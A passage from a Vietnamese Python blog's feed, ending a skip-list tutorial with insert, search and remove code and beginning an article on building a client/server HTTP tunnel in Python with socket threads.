            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;current_node&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;
            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;last_nodes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;down&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="n"&gt;current_node&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;down&lt;/span&gt;
                &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="k"&gt;break&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;last_nodes&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Cách hoạt động của hàm này được mô tả ở mục &lt;a class="reference internal" href="#tim-kiem-trong-danh-sach"&gt;Tìm kiếm trong danh sách&lt;/a&gt;, giá trị trả về là danh sách &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;p[N-1],&lt;/span&gt; &lt;span class="pre"&gt;p[N-2],&lt;/span&gt; &lt;span class="pre"&gt;...,&lt;/span&gt; p[0]&lt;/tt&gt; tương ứng với phần tử cuối cùng được duyệt đến tại các tầng &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;N-1,&lt;/span&gt; &lt;span class="pre"&gt;N-1,&lt;/span&gt; &lt;span class="pre"&gt;...,&lt;/span&gt; 0&lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;Lúc này hàm &lt;tt class="docutils literal"&gt;search&lt;/tt&gt; của chúng ta khá đơn giản, chỉ cần kiểm tra giá trị của phần tử cuối cùng được trả về bởi &lt;tt class="docutils literal"&gt;_search&lt;/tt&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;last_nodes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;last_nodes&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;

        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hàm &lt;tt class="docutils literal"&gt;insert&lt;/tt&gt; để thêm phần tử vào danh sách:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;new_value&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

        &lt;span class="n"&gt;last_nodes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;new_value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="c1"&gt;# Stop if the value is already there in the list&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;last_nodes&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;new_value&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt;

        &lt;span class="n"&gt;last_created_node&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;new_node&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SkipListNode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;new_value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;last_nodes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;last_node&lt;/span&gt;       &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;last_nodes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
                &lt;span class="n"&gt;new_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;last_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;
                &lt;span class="n"&gt;last_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;  &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new_node&lt;/span&gt;
            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;new_head&lt;/span&gt;       &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SkipListNode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="n"&gt;new_head&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;down&lt;/span&gt;  &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;head&lt;/span&gt;
                &lt;span class="n"&gt;new_head&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;  &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new_node&lt;/span&gt;
                &lt;span class="n"&gt;new_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;  &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;head&lt;/span&gt;      &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new_head&lt;/span&gt;

            &lt;span class="n"&gt;new_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;down&lt;/span&gt;      &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;last_created_node&lt;/span&gt;
            &lt;span class="n"&gt;last_created_node&lt;/span&gt;  &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new_node&lt;/span&gt;

            &lt;span class="c1"&gt;# We are flipping the coin now&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;break&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Và cuối cùng là hàm &lt;tt class="docutils literal"&gt;remove&lt;/tt&gt; để xóa phần tử khỏi danh sách:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;remove&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;current_node&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;head&lt;/span&gt;

        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="n"&gt;current_node&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;
                &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;

                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;\
                    &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;down&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;head&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;down&lt;/span&gt;
            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;down&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="n"&gt;current_node&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;current_node&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;down&lt;/span&gt;
                &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="k"&gt;break&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Về cơ bản hàm này khá giống hàm &lt;tt class="docutils literal"&gt;_search&lt;/tt&gt;: chúng ta vẫn duyệt từ &lt;tt class="docutils literal"&gt;head&lt;/tt&gt; để tìm kiếm giá trị &lt;tt class="docutils literal"&gt;value&lt;/tt&gt;. Điểm khác biệt là, nếu tìm thấy &lt;tt class="docutils literal"&gt;value&lt;/tt&gt; ở bất kỳ tầng nào, chúng ta tiến hành xóa phần tử khỏi tầng đó đồng thời xóa luôn tầng này nếu không còn phần tử (khác &lt;tt class="docutils literal"&gt;NULL&lt;/tt&gt;) nào khác.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="do-phuc-tap"&gt;
&lt;h2&gt;Độ phức tạp&lt;/h2&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Trung bình&lt;ul&gt;
&lt;li&gt;Bộ nhớ cần thiết: O(n)&lt;/li&gt;
&lt;li&gt;Thời gian tìm kiếm, thêm, xóa: O(logn)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tệ nhất&lt;ul&gt;
&lt;li&gt;Bộ nhớ cần thiết: O(n*logn)&lt;/li&gt;
&lt;li&gt;Thời gian tìm kiếm, thêm, xóa: O(n)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="ban-luan-them"&gt;
&lt;h2&gt;Bàn luận thêm&lt;/h2&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Các bạn có thể thấy ở thao tác &lt;strong&gt;Thêm phần tử&lt;/strong&gt;, danh sách không thay đổi nếu chúng ta thêm một phần tử vốn đã có sẵn trong danh sách. Điều này đồng nghĩa với việc chúng ta mặc định các phần tử là đôi một khác nhau. Hãy sửa lại các đoạn mã ở trên để danh sách nhảy cóc của chúng ta có thể hỗ trợ các phần tử giống nhau.&lt;/li&gt;
&lt;li&gt;Để ý rằng độ phức tạp của Danh Sách Nhảy Cóc tương đương với Cây Nhị Phân, ngoại trừ việc Danh Sách Nhảy Cóc sử dụng nhiều bộ nhớ hơn. Bạn đọc có thể chỉ ra điểm nhỉnh hơn của Danh Sách Nhảy Cóc không? (Gợi ý: chuyện gì xảy ra đối với hai danh sách khi có nhiều tiến trình muốn thêm phần tử vào danh sách &lt;strong&gt;cùng một lúc&lt;/strong&gt;?)&lt;/li&gt;
&lt;li&gt;Hãy viết hàm in ra trạng thái của danh sách nhảy cóc.&lt;/li&gt;
&lt;li&gt;Hãy viết hàm in ra các phần tử của danh sách nhảy cóc.&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
</content></entry><entry><title>Chương trình đường hầm HTTP bằng Python</title><link href="/2014/01/chuong-trinh-duong-ham-http-bang-python.html" rel="alternate"></link><published>2014-01-13T18:43:00+07:00</published><updated>2014-01-13T18:43:00+07:00</updated><author><name>Phan Đắc Anh Huy</name></author><id>tag:None,2014-01-13:/2014/01/chuong-trinh-duong-ham-http-bang-python.html</id><summary type="html">&lt;p&gt;(Bài gửi đến PCNV từ cộng tác viên &lt;a class="reference external" href="https://twitter.com/khuevu"&gt;Vũ Khuê&lt;/a&gt;. Xin cảm ơn bạn.)&lt;/p&gt;
&lt;div class="section" id="gioi-thieu"&gt;
&lt;h2&gt;Giới thiệu&lt;/h2&gt;
&lt;p&gt;Có những lúc bạn cần kết nối đến máy chủ ngoài mạng nội bộ ở một cổng không thuộc những giao thức ứng dụng phổ biến như HTTP hay HTTPS (cổng 80 hoặc 443 …&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;(Bài gửi đến PCNV từ cộng tác viên &lt;a class="reference external" href="https://twitter.com/khuevu"&gt;Vũ Khuê&lt;/a&gt;. Xin cảm ơn bạn.)&lt;/p&gt;
&lt;div class="section" id="gioi-thieu"&gt;
&lt;h2&gt;Giới thiệu&lt;/h2&gt;
&lt;p&gt;Có những lúc bạn cần kết nối đến máy chủ ngoài mạng nội bộ ở một cổng không thuộc những giao thức ứng dụng phổ biến như HTTP hay HTTPS (cổng 80 hoặc 443). Nhưnng điều đáng buồn là tường lửa chặn yêu cầu đến những cổng ngoài 80 hoặc 443. Khi đó, điều bạn có thể làm là thiết lập một chương trình trên một máy ngoại mạng. Chưong trình này nhận yêu cầu tử cổng 80 hoặc 443 và chuyển nó đến cổng và máy chủ thực sự. Việc này thường được gọi là thiết lập đường hầm (tunneling).&lt;/p&gt;
&lt;p&gt;Trên thực tế, chương trình &lt;tt class="docutils literal"&gt;ssh&lt;/tt&gt; với tuỳ chọn &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;-L&lt;/span&gt;&lt;/tt&gt; thường được sử dụng cho nhiệm vụ này. Tuy nhiên trong bài này chúng ta sẽ viết chương trinh đường hầm này dựa trên giao thức HTTP. Mục đích chính là miêu tả việc xử lý dữ liệu mạng tầm thấp với Python.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="cau-truc"&gt;
&lt;h2&gt;Cấu trúc&lt;/h2&gt;
&lt;p&gt;Chương trình này gồm 2 thành phần máy khách (client) và máy chủ (server)&lt;/p&gt;
&lt;dl class="docutils"&gt;
&lt;dt&gt;Tunnel.py&lt;/dt&gt;
&lt;dd&gt;Thành phần máy khách. Thành phần này nhận yêu cầu từ một cổng nhất định và bọc dữ liệu này duới dạng một yêu cầu HTTP rồi gửi đến thành phần máy chủ.&lt;/dd&gt;
&lt;dt&gt;Tunneld.py&lt;/dt&gt;
&lt;dd&gt;Thành phần máy chủ. Thành phần thực chất là một máy chủ HTTP (HTTP server). Khi có yêu cầu gửi đến, nó sẽ đọc yêu cầu này và thực hiện tác vụ tương ứng. Ví dụ như thực hiện kết nối với một máy khác hoặc chuyển dữ liệu từ tải của yêu cầu HTTP đến máy này.&lt;/dd&gt;
&lt;/dl&gt;
&lt;p&gt;Để thiết lập đường hầm, chạy 2 thành phần như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python tunnel.py -p &lt;span class="o"&gt;[&lt;/span&gt;client_listen_port&lt;span class="o"&gt;]&lt;/span&gt; -h &lt;span class="o"&gt;[&lt;/span&gt;target_host&lt;span class="o"&gt;]&lt;/span&gt;:&lt;span class="o"&gt;[&lt;/span&gt;target_port&lt;span class="o"&gt;]&lt;/span&gt;
python tunneld.py -p &lt;span class="o"&gt;[&lt;/span&gt;server_listen_port&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Một ứng dụng muốn gửi yêu cầu đến máy nào đó (target_host), nó cần gửi yêu cầu đó thông qua cổng mà tunnel.py được khởi tạo với (client_listen_port).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="trien-khai"&gt;
&lt;h2&gt;Triển khai&lt;/h2&gt;
&lt;p&gt;Bạn có thể tìm thấy mã chương trình tại &lt;a class="reference external" href="https://github.com/khuevu/http-tunnel"&gt;https://github.com/khuevu/http-tunnel&lt;/a&gt;.&lt;/p&gt;
&lt;div class="section" id="tunnel-py"&gt;
&lt;h3&gt;Tunnel.py&lt;/h3&gt;
&lt;p&gt;Thành phần này nghe ở một cổng nhất định. Nó có 2 tiểu trình (thread) riêng biệt để nhận và trả lời yêu cầu:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="n"&gt;BUFFER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1024&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;

&lt;span class="c1"&gt;#set global timeout&lt;/span&gt;
&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setdefaulttimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;SendThread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;threading&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Thread to send data to remote tunneld&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stopped&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
            &lt;span class="c1"&gt;# receive data and send to through tunnel&lt;/span&gt;
            &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BUFFER&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;ReceiveThread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;threading&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Thread to receive data from remote tunneld&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stopped&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
            &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;receive&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendall&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hằng số &lt;tt class="docutils literal"&gt;BUFFER&lt;/tt&gt; là lượng dữ liệu theo byte mà chường trình sẽ nhận từ ứng dụng trước khi gửi qua đường hầm. Có thể có nhiều ứng dụng kết nối với chương trình &lt;tt class="docutils literal"&gt;tunnel.py&lt;/tt&gt;. Vì thế, ta cần tạo kết nối riêng cho mỗi ứng dụng. Dưới đây là đoạn mã của lớp &lt;tt class="docutils literal"&gt;Connection&lt;/tt&gt;:&lt;/p&gt;
